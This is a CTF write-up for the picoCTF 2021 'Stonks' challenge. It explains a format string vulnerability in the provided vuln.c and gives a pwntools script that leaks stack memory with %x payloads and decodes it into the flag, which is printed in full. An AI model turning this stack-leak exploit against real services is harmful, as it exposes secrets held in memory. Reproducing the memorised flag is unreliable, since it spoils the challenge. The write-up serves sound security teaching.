# [picoCTF 2021](https://picoctf.org/) : Stonks
**Category**: Binary Exploitation (20 points)

> **Description**: *I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's  unsecure!*
>
> **Remote**: nc mercury.picoctf.net 59616\
> **Files Provided**:
> [vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c)
>
> **Hint**: *Okay, maybe I'd believe you if you find my API key.*

## stonks app

Let's first check to see how the Stonks App works. When we connect the server through netcat, we are welcomed by this CLI (command-line interface) to buy *stonks* or view our portfolio.
```
cicero@cicero-pen:~/Desktop/writeups/picoCTF/stonks$ nc mercury.picoctf.net 59616
Welcome back to the trading app!

What would you like to do?

1) Buy some stonks!
2) View my portfolio

> |
```

When we choose to buy stonks, we see the algorithm in action. We provide it with an API token, and get our stonks.

```
> 1

Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
> flag_please
Buying stonks with token:
flag_please
Portfolio as of Wed Dec 27 21:22:19 UTC 2023

1 shares of M
1 shares of Q
8 shares of HKDN
137 shares of JZ
189 shares of SVIU
Goodbye!
```

When we choose to look at our portfolio, we always get this abrupt response that we don't own any stonks and get disconnected.

```
> 2

Portfolio as of Wed Dec 27 21:24:39 UTC 2023

You don't own any stonks!
Goodbye!

```

## analysis of vuln.c

The source code for this application is provided to us. When finding vulnerabilities in these types of files, it is good to start by
finding where the user is allowed to provide input to the program.\
In the main function, we get our first oppurtinity to provide input, and that is to supply an integer to access the options we saw in the CLI. The logic
here is scoped, so no vulnerabilities here.

```C
    /* in main function */
    printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp); // <-- user input

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

    /* exit program */
```

In the *buy_stonks* function, we can see what appears to be a buffer that loads the flag into program memory. We do not get direct access to this
buffer (by normal means), but it is there on the stack for us to grab.
```C
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}

    /* read flag into memory (on stack) */
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

    /* code continues ... */

```

Shortly following this, we find our next user input. We memory allocate 300 + 1 bytes of memory for a user input buffer, and read in explicitly a max of 300 characters via *scanf*. Since the program limits the number of characters to 300, we do not have the ability to overflow this buffer because it contains 301 bytes (extra byte for the null terminated char).

However, the program then executes the *printf* function using our terminated string for its first argument. This opens up the program to be exploited by the *format string vulnerability*.

```C
    /* in buy_stonks function  */

    char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf); // <-- user input
	printf("Buying stonks with token:\n");
	printf(user_buf); // <--- format string vulnerability

    /* code continues ... */
```
## format string vulnerability

*What is a format string vulnerability?*

This vulnerability results from uncontrolled format strings. A format string is a way to implement [string interpolation](https://en.wikipedia.org//wiki/String_interpolation), in this case through *printf* to print strings on the command line. Like many string interpolation functions, the important key here is that *printf* is a [variadic function](https://en.wikipedia.org/wiki/Variadic_function), meaning that it can pass in any number of arguments. 

While understanding x86 stack calling conventions is not strictly necessary for this challenge, what is important to note is that when *printf* is called, the arguments passed are pushed to the stack, as shown in this example.

[<img src="https://github.com/Reaganak40/ctf-writeups/blob/main/common/stack-convention-x86.png?raw=true">](https://github.com/Reaganak40/ctf-writeups/blob/main/common/stack-convention-x86.png?raw=true)

How does *printf* know how many arguments we passed to it? It doesn't. Rather it utilizes the first parameter which will always be at stack location [ebp + 8], and reads it as a format string. The string will tell *printf* how many and what kind of arguments were passed in its argument list. At least, this is how is should work.

```C
printf("Hello there, my magical number is: %d", 5); // <-- replaces %d with "parameter2" (5)
```

We do not have to be honest about how many or what kind of arguments were passed to *printf*. In fact, we can pass no arguments but the format string, and still make it read memory from the stack. While *printf* might think that it is reading a function argument, it is reading arbitrary nonsense. 

```C
printf("%x") // <-- prints 9d883b0 (on my computer)
```

*printf* is actually a very powerful function, allowing both reading and writing capabilities. Given a creative enough format string, you can make a program do all sorts of fancy things. In this case, we are interested in reading a char buffer that resides somewhere on the stack. Since the programmer gave us access to the format string parameter, we can leak the stack at any offset we want. We just need to input a format string that will read, from the stack, the characters of our flag.

## testing the vulnerability

Going back the stonks app, when the program requests for our API token, we can send the specifier character **%x**, which will tell *printf* to print an integer variable in hex from the stack. We do this multiple times for good measure. As seen below, we are getting many values, in hex, found on the stack.

```
cicero@cicero-pen:~/Desktop/writeups/picoCTF/stonks$ nc mercury.picoctf.net 59616

Welcome back to the trading app!
What would you like to do?

1) Buy some stonks!
2) View my portfolio
> 1

Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
> %x.%x.%x.%x.%x.%x

Buying stonks with token:
8ba1390.804b000.80489c3.f7f7cd80.ffffffff.1

Portfolio as of Wed Dec 27 23:11:02 UTC 2023

35 shares of UK
3 shares of MQE
15 shares of SI
21 shares of VWA
420 shares of VVW
Goodbye!
```

Now it is just a matter of finding where on the stack is our flag buffer. While we can be more intelligent about it, since we have the source code and knowing the calling conventions can calculate exactly where the buffer is located, it is easier in this case to be more crude and just find it through brute force.

# pwn script

Using my [pwn script template](https://github.com/Reaganak40/ctf-writeups/blob/main/scripts/exploit.py), I created a script that will allow me to easily connect remotely and send payloads. I design a payload that will send many *%x* arguments at the vulnerable input. In this case I am also utilizing the *$* specifier with it to print at the numbered argument. To start off, I will look print in hex, the first 30 arguments from the stack.

```python
#!/usr/bin/env python3

from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

io = start()

payload = b""

# print first 30 arguments (integers) from the stack
for i in range(1, 30):
    payload += f'%{i}$x.'.encode()

# go to view portfolio
io.sendlineafter(b'2) View my portfolio\n', b'1')

# fmt string vulnerability
io.sendlineafter(b'What is your API token?\n', payload)

# junk
io.recvline()

# Receive the flag
leak = io.recvline()

print(leak)

io.close()
```

When we execute this script, connecting remotely, and printing what the server sent back to us, we get this byte string.

```
cicero@cicero-pen:~/Desktop/writeups/picoCTF/stonks$ ./exploit.py REMOTE mercury.picoctf.net 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done

b'910c370.804b000.80489c3.f7f10d80.ffffffff.1.910a160.f7f1e110.f7f10dc7.0.910b180.3.910c350.910c370.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.38343136.34356562.ffbd007d.f7f4baf8.f7f1e440.e9267f00.1.0.\n'

[*] Closed connection to mercury.picoctf.net port 59616

```

Our flag is likely in here, we just aren't viewing it in the typical char format, casting it into a 4 byte integer instead of a 1 byte char. We need to decode this byte buffer
into an ascii string. Since we are viewing each stack value as an integer, we can expect each stack value to contain 4 chars. So, we need to evaluate each stack value, not as
a 4 byte integer, but as a 4 byte char array. Since the bytes will be in little-endian we need to reverse the chars. For example:

```
    Given: 0x67616c66

    1) Evaluate as: 0x67 0x61 0x6c 0x66
    2) Cast each byte to an ascii char: 'g' 'a' 'l' 'f
    3) Reverse: 'f' 'l' 'a' 'g'
    4) result: 'flag'
```

We modify our script to decode in this way.


```python
# Receive the flag
leak = io.recvline()

io.close()

# decode flag bytes
vals = [x.decode() for x in leak.split(b'.')[:-1]]

for i, v in enumerate(vals):
    if len(v) != 8:
        v = "0" * (8 - len(v)) + v

    for i in range(7, 0, -2):
        x = int(f"{v[i-1]}{v[i]}", 16)

        if (x > 32) and x < 126:
            print(chr(x), end='')
    print(".", end='')
```

When we run it remotely we get this as output.

```
cicero@cicero-pen:~/Desktop/writeups/picoCTF/stonks$ ./exploit.py REMOTE mercury.picoctf.net 59616

[+] Opening connection to mercury.picoctf.net on port 59616: Done
[*] Closed connection to mercury.picoctf.net port 59616

PD......`!....1..0D.PD.pico.CTF{.I_l0.5t_4.ll_m.y_m0.n3y_.6148.be54.}..@.tz...
```

We can see the picoCTF{...}, now we just need to pretty it but a bit. I determined the *printf* stack offsets to get to our buffer are between
arguments **$14** and **$24**. These should also always be full hex values with 8 bytes. Scoping the format string to these offsets, and removing
the excessive '.' delimiter we get this for our final script.

```python
# Receive the flag
leak = io.recvline()

io.close()

# decode flag bytes
vals = [x.decode() for x in leak.split(b'.')[:-1]]

# print flag
for i, v in enumerate(vals):
    if len(v) == 8:
        for i in range(7, 0, -2):
            x = int(f"{v[i-1]}{v[i]}", 16)

            if (x > 32) and x < 126:
                print(chr(x), end='')
print("\n")
```

When we run this script we get our flag, clear and neatly formatted.

```
[+] Opening connection to mercury.picoctf.net on port 59616: Done
[*] Closed connection to mercury.picoctf.net port 59616

picoCTF{I_l05t_4ll_my_m0n3y_6148be54}
```